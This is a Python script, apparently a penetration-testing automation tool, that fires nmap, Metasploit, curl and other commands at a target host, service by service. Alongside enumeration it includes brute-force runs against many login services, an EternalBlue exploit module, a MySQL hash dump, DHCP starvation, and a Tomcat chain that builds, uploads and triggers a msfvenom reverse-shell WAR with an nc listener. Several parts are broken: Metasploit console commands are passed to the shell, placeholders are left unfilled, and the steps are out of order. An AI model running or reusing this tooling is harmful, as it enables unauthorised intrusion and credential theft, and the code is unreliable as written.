#!/usr/bin/python3

#sudo nc -l -p 21
import nmap
import subprocess

def perform_ftp_scans(target):
    # Perform FTP vulnerability scans if port 21 is open.
    ftp_scans = {
        "ftp_banner_grabbing": ["nmap", "-sV", "--script=banner", "-p", "21", target],
        "ftp_anonymous_access": ["nmap", "-sV", "--script=ftp-anon", "-p", "21", target],
        "ftp_bounce_scan": ["nmap", "-sV", "-sC", "-p", "21", target],
        "ftp_brute_force": ["nmap", "--script=ftp-brute", "-p", "21", target],
    }

    print("Starting FTP vulnerability scans...")
    for scan_name, scan_command in ftp_scans.items():
        print(f"Running {scan_name}...")
        subprocess.run(scan_command)
    print("Completed FTP vulnerability scans.")

def perform_ssh_scans(target):
    # Perform SSH vulnerability scans if port 22 is open.
    ssh_scans = {
        "ssh_banner_grabbing": ["nmap", "-sV", "--script=banner", "-p", "22", target],
        "ssh_weak_algos": ["nmap", "--script=ssh2-enum-algos", "-p", "22", target],
        "ssh_weak_ciphers": ["nmap", "--script=ssh2-enum-algos", "-p", "22", target],
        "ssh_weak_macs": ["nmap", "--script=ssh2-enum-algos", "-p", "22", target],
        "ssh_v1_support": ["nmap", "--script=sshv1", "-p", "22", "-n", target]
    }

    print("Starting SSH vulnerability scans...")
    for scan_name, scan_command in ssh_scans.items():
        print(f"Running {scan_name}...")
        subprocess.run(scan_command)
    print("Completed SSH vulnerability scans.")

def perform_telnet_scans(target):
    # Perform Telnet vulnerability scans if port 23 is open.
    telnet_scans = {
        "telnet_version": ["nmap", "-sV", "--script=banner", "-p", "23", target],
        "telnet_brute_force": ["nmap", "-p", "23", "--script", "telnet-brute", "--script-args", "userdb=myusers.lst,passdb=mypwds.lst,telnet-brute.timeout=8s", target],
        "telnet_ntlm_info": ["nmap", "-p", "23", "--script=telnet-ntlm-info", target],
        "telnet_encryption": ["nmap", "-p", "23", "--script=telnet-encryption", target]
    }

    print("Starting Telnet vulnerability scans...")
    for scan_name, scan_command in telnet_scans.items():
        print(f"Running {scan_name}...")
        subprocess.run(scan_command)
    print("Completed Telnet vulnerability scans.")

def perform_smtp_scans(target):
    # Perform SMTP vulnerability scans if port 25, 465, or 587 is open.
    smtp_scans = {
        "smtp_version": ["nmap", "-sV", "--script=banner", "-p", "25", target],
        "smtp_open_relay": ["nmap", "--script=smtp-open-relay", "--script-args", "smtp-open-relay.domain=<domain>,smtp-open-relay.ip=<address>", "-p", "25,465,587", target],
        "smtp_enum_users": ["nmap", "--script=smtp-enum-users", "--script-args", "smtp-enum-users.methods={EXPN,...}", "-p", "25,465,587", target],
        "smtp_commands": ["nmap", "--script=smtp-commands", "--script-args", "smtp-commands.domain=<domain>", "-pT:25,465,587", target],
        "smtp_brute_force": ["nmap", "-p", "25", "--script=smtp-brute", target]
    }

    print("Starting SMTP vulnerability scans...")
    for scan_name, scan_command in smtp_scans.items():
        print(f"Running {scan_name}...")
        subprocess.run(scan_command)
    print("Completed SMTP vulnerability scans.")

def perform_dns_scans(target):
    # Perform DNS vulnerability scans if port 53 is open.
    dns_scans = {
        "dns_bruteforce": ["nmap", "--script=dns-brute", "-p", "53", target],
        "dns_basic_info": ["nmap", "-sV", "--script=dns-info", "-p", "53", target],
        "dns_reverse_lookup": ["nmap", "-sV", "--script=dns-reverse-lookup", "-p", "53", target],
        "dns_srv_enum": ["nmap", "-sV", "--script=dns-srv-enum", "-p", "53", target],
        "dns_zone_transfer": ["nmap", "--script=dns-zone-transfer", "--script-args", "dns-zone-transfer.domain=example.com", "-p", "53", target],
        "dns_cache_snoop": ["nmap", "-sU", "-p", "53", "--script=dns-cache-snoop", target],
        "dns_check_zone": ["nmap", "-sn", "-Pn", "--script=dns-check-zone", "--script-args=dns-check-zone.domain=example.com", "-p", "53", target],
        "dns_recursion": ["nmap", "-Pn", "-sU", "-p", "53", "--script=dns-recursion", target]
    }

    print("Starting DNS vulnerability scans...")
    for scan_name, scan_command in dns_scans.items():
        print(f"Running {scan_name}...")
        subprocess.run(scan_command)
    print("Completed DNS vulnerability scans.")

def perform_http_scans(target):
    # Perform HTTP vulnerability scans if port 80 is open.
    http_scans = {
        "http_trace_track": ["curl", "-v", "-X", "TRACE", f"{target}:80"],
        "apache_etag_header": ["curl", "-v", "-X", "GET", f"{target}:80"],
        "http_sys_rce": ["curl", "-v", f"{target}:80/", "-H", "Host: irrelevant", "-H", "Range: bytes=0-18446744073709551615"]
    }

    print("Starting HTTP vulnerability scans...")
    for scan_name, scan_command in http_scans.items():
        print(f"Running {scan_name}...")
        subprocess.run(scan_command)
    print("Completed HTTP vulnerability scans.")

def perform_pop3_scans(target):
    # Perform POP3 vulnerability scans if port 110 is open.
    pop3_scans = {
        "pop3_banner_grabbing_cmd": ["nmap", "-sV", "--script=banner", target],
        "pop3_brute_force_cmd": ["nmap", "-sV", "--script=pop3-brute", target]
    }

    print("Starting POP3 vulnerability scans...")
    for scan_name, scan_command in pop3_scans.items():
        print(f"Running {scan_name}...")
        subprocess.run(scan_command)
    print("Completed POP3 vulnerability scans.")

def perform_rpcbind_scans(target):
    # Perform RPCBIND vulnerability scans if port 111 is open.
    rpcbind_scans = {
        "nfs_mount_discloser_cmd": ["nmap", "-sV", target],
        "rpc_information_discloser_cmd": ["rpcinfo", "-p", target]
    }

    print("Starting RPCBIND vulnerability scans...")
    for scan_name, scan_command in rpcbind_scans.items():
        print(f"Running {scan_name}...")
        subprocess.run(scan_command)
    print("Completed RPCBIND vulnerability scans.")

def perform_msrpc_scans(target):
    # Perform MSRPC vulnerability scans if port 135 is open.
    msrpc_scans = {
        "msrpc_enumeration_cmd": ["nmap", target, "--script=msrpc-enum"],
        "msrpc_null_authentication_cmd_1": ["nmap", "--script=smb-enum-sessions.nse", "-p445", target],
        "msrpc_null_authentication_cmd_2": ["sudo", "nmap", "-sU", "-sS", "--script=smb-enum-sessions.nse", "-p", "U:137,T:139", target],
        "msrpc_null_authentication_cmd_3": ["rpcclient", "--U", "<username>", target]
    }

    print("Starting MSRPC vulnerability scans...")
    for scan_name, scan_command in msrpc_scans.items():
        print(f"Running {scan_name}...")
        subprocess.run(scan_command)
    print("Completed MSRPC vulnerability scans.")

def perform_netbios_scans(target):
    # Perform NetBIOS vulnerability scans if ports 139 or 445 are open.
    netbios_scans = {
        "netbios_enumeration_enum": ["enum", "-UMNSPGLdc", "-u", "<username>", "-p", "<password>", "-f", "dictfile", target],
        "netbios_enumeration_net_view": ["net", "view", f"\\\\{target}"],
        "netbios_enumeration_nmap": ["sudo", "nmap", "-sU", "--script", "nbstat.nse", "-p137", target],
        "netbios_brute_force_nmap": ["nmap", "--script", "smb-brute.nse", "-p445", target],
        "netbios_brute_force_nmap_alt": ["sudo", "nmap", "-sU", "-sS", "--script", "smb-brute.nse", "-p", "U:137,T:139", target],
        "netbios_broadcast_information_discloser": ["nmap", "--script", "broadcast-netbios-master-browser"]
    }

    print("Starting NetBIOS vulnerability scans...")
    for scan_name, scan_command in netbios_scans.items():
        print(f"Running {scan_name}...")
        subprocess.run(scan_command)
    print("Completed NetBIOS vulnerability scans.")

def perform_imap_scans(target):
    # Perform IMAP vulnerability scans if ports 143 or 993 are open.
    imap_scans = {
        "imap_capabilities_disclosed": ["nmap", "-sV", "-sC", target],
        "imap_ntlm_info": ["nmap", "-p", "143,993", "--script", "imap-ntlm-info", target],
        "imap_brute_force": ["nmap", "-p", "143,993", "--script", "imap-brute", target]
    }

    print("Starting IMAP vulnerability scans...")
    for scan_name, scan_command in imap_scans.items():
        print(f"Running {scan_name}...")
        subprocess.run(scan_command)
    print("Completed IMAP vulnerability scans.")


def perform_https_scans(target):
    # Perform HTTPS vulnerability scans if port 443 is open.
    https_scans = {
        "ssl_cert_check": ["nmap", "-sV", "-p", "443", "--script=ssl-cert", target],
        "ssl_protocol_detection": ["nmap", "-sV", "--script=ssl-enum-ciphers", "-p", "443", target],
        "ssl_poodle_vulnerability": ["nmap", "-sV", "--version-light", "--script=ssl-poodle", "-p", "443", target],
        "ssl_heartbleed": ["nmap", "-p", "443", "--script=ssl-heartbleed", target],
        "ssl_dh_params": ["nmap", "--script=ssl-dh-params", target],
        "ssl_weak_rsa_keys": ["nmap", "-sV", "-p", "443", "--script=ssl-cert", target],
        "ssl_weak_hash_algo": ["nmap", "-sV", "-p", "443", "--script=ssl-cert", target],
        "ssl_cert_expiry": ["nmap", "-sV", "-p", "443", "--script=ssl-cert", target],
        "ssl_wrong_hostname": ["nmap", "-sV", "-p", "443", "--script=ssl-cert", target],
        "ssl_ccs_injection": ["nmap", "-p", "443", "--script=ssl-ccs-injection", target],
        "ssl_sweet32": ["nmap", "-sV", "--script=ssl-enum-ciphers", "-p", "443", target],
        "ssl_lucky13": ["nmap", "-sV", "--script=ssl-enum-ciphers", "-p", "443", target],
        "ssl_rc4": ["nmap", "-sV", "--script=ssl-enum-ciphers", "-p", "443", target]
    }

    print("Starting HTTPS vulnerability scans...")
    for scan_name, scan_command in https_scans.items():
        print(f"Running {scan_name}...")
        subprocess.run(scan_command)
    print("Completed HTTPS vulnerability scans.")

# def perform_smb_scans(target):
#     # Perform SMB vulnerability scans if port 445 is open.
#     smb_scans = {
#         "smb_enum_shares": ["nmap", "--script=smb-enum-shares", "-p", "445", target],
#         "smb_enum_users": ["nmap", "--script=smb-enum-users", "-p", "445", target],
#         "smb_vuln_ms08_067": ["nmap", "--script=smb-vuln-ms08-067", "-p", "445", target],
#         "smb_vuln_cve_2020_0796": ["nmap", "--script=smb-vuln-cve-2020-0796", "-p", "445", target]
#     }

#     print("Starting SMB vulnerability scans...")
#     for scan_name, scan_command in smb_scans.items():
#         print(f"Running {scan_name}...")
#         subprocess.run(scan_command)
#     print("Completed SMB vulnerability scans.")

def perform_smb_scans(target):
    # Perform SMB vulnerability scans if port 445 is open.
    smb_scans = {
        "smb_version_1": ["use", "auxiliary/scanner/smb/smb_version"],
        "smb_version_2": ["nmap", "-sV", "--script=banner", target],
        "smb_null_session_auth_1": ["rpcclient", "-U", '""', target],
        "smb_null_session_auth_2": ["smbclient", "-L", target],
        "smb_null_session_auth_3": ["smbclient", f"//{target}/IPC$", "-N"],
        "smb_signing_required": ["nmap", "--script", "smb-security-mode", "-p445", target],
        "smb_signing_disabled": ["nmap", "--script", "smb-security-mode", "-p445", target],
        "smb_v1_vulnerabilities": ["nmap", "--script", "smb-protocols", target],
        "smb_eternalblue_1": ["nmap", "-p445", "--script", "smb-vuln-ms17-010", target],
        "smb_eternalblue_2": ["use", "exploit/windows/smb/ms17_010_eternalblue"]
    }

    print("Starting SMB vulnerability scans...")
    for scan_name, scan_command in smb_scans.items():
        print(f"Running {scan_name}...")
        subprocess.run(scan_command)
    print("Completed SMB vulnerability scans.")

def perform_snmp_scans(target):
    # Perform SNMP vulnerability scans if port 161 is open.
    snmp_scans = {
        "snmp_default_community_name": ["./snmpcheck-1.8.pl", "-t", target, "-c", "public"],
        "snmp_enumeration": ["use", "auxiliary/scanner/snmp/snmp_enum"],
        "snmp_mib_enumeration": ["nmap", "-sU", "-p 161", "--script=snmp-interfaces", target],
        "snmp_bruteforce": ["nmap", "-sU", "--script", "snmp-brute", target, "--script-args", "snmp-brute.communitiesdb=<wordlist>"]
    }

    print("Starting SNMP vulnerability scans...")
    for scan_name, scan_command in snmp_scans.items():
        print(f"Running {scan_name}...")
        subprocess.run(scan_command)
    print("Completed SNMP vulnerability scans.")

def perform_ldap_scans(target):
    # Perform LDAP vulnerability scans if port 389 is open.
    ldap_scans = {
        "ldap_enumeration": ["nmap", "-p 389", "--script=ldap-rootdse", target],
        "ldap_brute_force": ["nmap", "-p 389", "--script=ldap-brute", "--script-args", 'ldap.base="cn=users,dc=cqure,dc=net"', target],
        "ldap_null_base_search": ["ldapsearch", "-h", target, "-x", "-s", "base"]
    }

    print("Starting LDAP vulnerability scans...")
    for scan_name, scan_command in ldap_scans.items():
        print(f"Running {scan_name}...")
        subprocess.run(scan_command)
    print("Completed LDAP vulnerability scans.")

def perform_dhcp_scans(target):
    # Perform DHCP vulnerability scans if port 67 or 68 is open.
    dhcp_scans = {
        "dhcp_discover_request": ["nmap", "-sU", "-p 67", "--script=dhcp-discover", target],
        "dhcp_starvation_attack": ["dhcp_starve.py", target]
    }

    print("Starting DHCP vulnerability scans...")
    for scan_name, scan_command in dhcp_scans.items():
        print(f"Running {scan_name}...")
        subprocess.run(scan_command)
    print("Completed DHCP vulnerability scans.")

def perform_mysql_scans(target):
    # Perform MySQL vulnerability scans if port 3306 is open.
    mysql_scans = {
        "mysql_version": ["use", "auxiliary/scanner/mysql/mysql_version"],
        "mysql_hashdump": ["use", "auxiliary/scanner/mysql/mysql_hashdump"],
        "mysql_brute_force_1": ["use", "auxiliary/scanner/mysql/mysql_login"],
        "mysql_brute_force_2": ["nmap", "--script=mysql-brute", target]
    }

    print("Starting MySQL vulnerability scans...")
    for scan_name, scan_command in mysql_scans.items():
        print(f"Running {scan_name}...")
        subprocess.run(scan_command)
    print("Completed MySQL vulnerability scans.")

def perform_rdp_scans(target):
    # Perform RDP vulnerability scans if port 3389 is open.
    rdp_scans = {
        "rdp_encryption_level_check_1": ["nmap", "-Pn", "--script", "rdp-enum-encryption", "-p3389", target],
        "rdp_encryption_level_check_2": ["perl", "rdp-sec-check.pl", target],
        "rdp_mitm_vulnerability_check_1": ["perl", "rdp-sec-check.pl", target],
        "rdp_mitm_vulnerability_check_2": ["cpan", "Encoding::BER"],
        "rdp_nla_check": ["rdesktop", target],
        "rdp_rce_vulnerability_check": ["nmap", "-p3389", "--script=rdp-vuln-ms12-020", target],
        "rdp_schannel_rce_check_1": ["git", "clone", "https://github.com/anexia-it/winshock-test.git"],
        "rdp_schannel_rce_check_2": ["./winshock_test.sh", target, "<port>"]
    }

    print("Starting RDP vulnerability scans...")
    for scan_name, scan_command in rdp_scans.items():
        print(f"Running {scan_name}...")
        subprocess.run(scan_command)
    print("Completed RDP vulnerability scans.")

def perform_vnc_scans(target):
    # Perform VNC vulnerability scans if port 5900 is open.
    vnc_scans = {
        "vnc_authentication_none_detection": ["use", "auxiliary/scanner/vnc/vnc_none_auth"],
        "vnc_authentication_scanning": ["use", "auxiliary/scanner/vnc/vnc_login"]
    }

    print("Starting VNC vulnerability scans...")
    for scan_name, scan_command in vnc_scans.items():
        print(f"Running {scan_name}...")
        subprocess.run(scan_command)
    print("Completed VNC vulnerability scans.")

def perform_http_proxy_scans(target):
    # Perform HTTP-PROXY vulnerability scans if port 8080 is open.
    http_proxy_scans = {
        "tomcat_application_manager_login": ["use", "auxiliary/scanner/http/tomcat_mgr_login"],
        "deploy_war_file": ["curl", "-T", "shell.war", f"http://{target}:8080/manager/text/deploy?path=/shell&update=true"],
        "trigger_reverse_shell": ["curl", f"http://{target}:8080/shell/shell.jsp?cmd=whoami"],
        "create_war_file": ["msfvenom", "-p", "java/jsp_shell_reverse_tcp", f"LHOST={target}", "LPORT=4444", "-f", "war", "-o", "shell.war"],
        "start_listener": ["nc", "-l", "-v", "-p", "4444"],
        "web_directory_enumeration": ["dirb", target]
    }

    print("Starting HTTP-PROXY vulnerability scans...")
    for scan_name, scan_command in http_proxy_scans.items():
        print(f"Running {scan_name}...")
        subprocess.run(scan_command)
    print("Completed HTTP-PROXY vulnerability scans.")

def perform_nfs_scans(target):
    # Perform NFS vulnerability scans if port 2049 is open.
    nfs_scans = {
        "nfs_shares_world_readable": ["nmap", "-sV", "--script=nfs-showmount", target],
        "showmount_list_shares": ["showmount", "-e", target],
        "install_nfs_common": ["sudo", "apt-get", "install", "-y", "nfs-common"],
        "mount_nfs_share": ["sudo", "mount", "-t", "nfs", f"{target}:/<directory>", "<local_directory>", "-o", "nolock"]
    }

    print("Starting NFS vulnerability scans...")
    for scan_name, scan_command in nfs_scans.items():
        print(f"Running {scan_name}...")
        subprocess.run(scan_command)
    print("Completed NFS vulnerability scans.")

def perform_ntp_scans(target):
    # Perform NTP vulnerability scans if port 123 is open.
    ntp_scans = {
        "ntp_mode_6_scanner": ["nmap", "-sU", "-p", "123", "--script", "ntp-info", target],
        "ntpq_rv": ["ntpq", "-c", "rv", target],
        "ntp_monlist_dos": ["nmap", "-sU", "-pU:123", "-Pn", "-n", "--script=ntp-monlist", target],
        "ntpdc_monlist": ["ntpdc", "-n", "-c", "monlist", target],
        "ntpdc_sysinfo": ["ntpdc", "-c", "sysinfo", target]
    }

    print("Starting NTP vulnerability scans...")
    for scan_name, scan_command in ntp_scans.items():
        print(f"Running {scan_name}...")
        subprocess.run(scan_command)
    print("Completed NTP vulnerability scans.")

def perform_ident_scans(target):
    # Perform Ident vulnerability scans if port 113 is open.
    ident_scans = {
        "ident_auth_owners_detection": ["nmap", "-sV", "-sC", target],
        "ident_user_enumeration": ["perl", "ident-user-enum.pl", target]
    }

    print("Starting Ident vulnerability scans...")
    for scan_name, scan_command in ident_scans.items():
        print(f"Running {scan_name}...")
        subprocess.run(scan_command)
    print("Completed Ident vulnerability scans.")

def perform_kerberos_scans(target):
    # Perform Kerberos vulnerability scans if port 88 is open.
    kerberos_scans = {
        "krb5_users_enumeration": ["nmap", "-p", "88", "--script=krb5-enum-users", "--script-args=krb5-enum-users.realm='XX-XXXT'", target]
    }

    print("Starting Kerberos vulnerability scans...")
    for scan_name, scan_command in kerberos_scans.items():
        print(f"Running {scan_name}...")
        subprocess.run(scan_command)
    print("Completed Kerberos vulnerability scans.")

def perform_rlogin_scans(target):
    # Perform Rlogin vulnerability scans if port 513 is open.
    rlogin_scans = {
        "rlogin_authentication_scanning": ["use", "auxiliary/scanner/rservices/rlogin_login"]
    }

    print("Starting Rlogin vulnerability scans...")
    for scan_name, scan_command in rlogin_scans.items():
        print(f"Running {scan_name}...")
        subprocess.run(scan_command)
    print("Completed Rlogin vulnerability scans.")

def perform_postgresql_scans(target):
    # Perform PostgreSQL vulnerability scans if port 5432 is open.
    postgresql_scans = {
        "postgres_version_probe": ["use", "auxiliary/scanner/postgres/postgres_version"],
        "postgres_login": ["use", "auxiliary/scanner/postgres/postgres_login"],
        "postgres_dbname_flag_injection": ["use", "auxiliary/scanner/postgres/postgres_dbname_flag_injection"]
    }

    print("Starting PostgreSQL vulnerability scans...")
    for scan_name, scan_command in postgresql_scans.items():
        print(f"Running {scan_name}...")
        subprocess.run(scan_command)
    print("Completed PostgreSQL vulnerability scans.")

def perform_redis_scans(target):
    # Perform Redis vulnerability scans if port 6379 is open.
    redis_scans = {
        "redis_info_disclosure": ["nmap", "-p", "6379", "--script", "redis-info", target],
        "redis_brute_force_nmap": ["nmap", "-p", "6379", "--script", "redis-brute", target],
        "redis_brute_force_msf": ["use", "auxiliary/scanner/redis/redis_login"],
        "redis_file_upload": ["use", "auxiliary/scanner/redis/file_upload"]
    }

    print("Starting Redis vulnerability scans...")
    for scan_name, scan_command in redis_scans.items():
        print(f"Running {scan_name}...")
        subprocess.run(scan_command)
    print("Completed Redis vulnerability scans.")
